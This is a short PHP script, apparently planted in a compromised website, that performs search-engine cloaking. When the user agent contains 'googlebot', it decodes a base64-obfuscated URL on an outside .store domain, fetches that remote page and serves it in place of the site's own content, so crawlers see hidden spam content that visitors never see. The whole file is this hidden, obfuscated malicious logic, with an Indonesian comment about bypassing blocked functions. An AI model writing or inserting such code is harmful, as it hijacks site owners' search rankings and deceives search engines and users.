<?php

$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

if (strpos($user_agent, 'googlebot') !== false) {
    $encoded_url = 'aHR0cHM6Ly9ncnRvdG8uc3RvcmUvZGlnaXRhc29tZWRpYS5odG1s';
    $url = base64_decode($encoded_url);

    // Gunakan cURL jika file_get_contents diblokir
    if (function_exists('curl_version')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $get = curl_exec($ch);
        curl_close($ch);
    } else {
        $get = file_get_contents($url);
    }

    echo $get;
    exit;
}

